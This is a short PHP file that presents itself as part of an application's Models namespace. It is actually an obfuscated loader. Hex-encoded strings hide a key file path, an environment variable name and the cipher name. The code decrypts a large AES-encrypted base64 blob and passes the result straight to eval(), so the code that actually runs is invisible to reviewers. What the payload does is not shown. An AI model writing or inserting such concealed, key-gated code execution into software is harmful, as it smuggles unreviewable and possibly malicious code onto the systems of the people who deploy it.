<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ormv+FjEcfCNDnsGsgeEGw==');

$c=base64_decode(

'6coEma5D86d4DOXTRt/jkccIKqK7Iknzeqgm3hN9vFSGwIVXz0K6GMQ9V5LRoHE6pui48WX2c0Nc' .
'l/6U50pbGELbjt75rQwr2mtW+LdOZDGFRsuo2j5Q6jn83/eB+1Txtv4/SYAVtfbge7U8Cf2fnnP7' .
'URvkYtdd404wP1l59bsB1HAai7Bp3+KnFUX5e1t5/7hadGku1j8G68BUlbXSGV10+UqYQCz8NZcH' .
'c6teOG0qcoNMPsAwovkOtUXYBQenLSHdUPABiY5vqnv0hFBoK23ubuUdZG5B2q2G+HboqvVfR2A1' .
'CqVb5sqLVTHKIml7odvP9te0ze4BaKoG0ODRKQSoEmJd7eJP2lzDzkMV5zHDfmOkKTXdR5etXsgt' .
'zNVcQlidqf/a8HeztVQFaOYMZLbZIMo5eBISZDZLFyg36J5hJq80Qmzxu1cTXljMOL6sybVfEiM9' .
'gG1XZJZXxdfx/Eoec9mY3jX1mEVXKdtpbKq2C69rFJq9bM1Eskj8QMSPqK3TYGabIYUPcPOMX1cd' .
'cu5SsOSoHItNxAKii17Zih3qvBfiGLipBHa2G9cEI+Ujo8YJ9mNXKy4JCSRneiFvyL98NqgHs7CG' .
'RKMOfC9w1mXIgGzhUxE0dbMnSdIIsqyJq7hCHl9VdNnhI+wsQpnNQ4Z2j8Gp7tofBTE5gCYw7zwV' .
'aGfcFcgk0uRhZmlz+ncdehPmtU6zNk6CdP7GgixYWlnr0pA0Urpsq1cFKq7yveVDFQZbjoAu84Eo' .
'vq+CkCPrLV2K8NhduTvY3zcQrT+kz6+DSwKC9SGjrVUnbQXAjP2ctOZQn1S07VqBxvNOIt8clGlB' .
'no7aE9p4u6RhWe0y1rQTtOaWaZhNKqkZ2biQsz/HV9HtvAZbKys3tP73KDglM7pP1Vr7WOlLqDMQ' .
'1sMvQQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

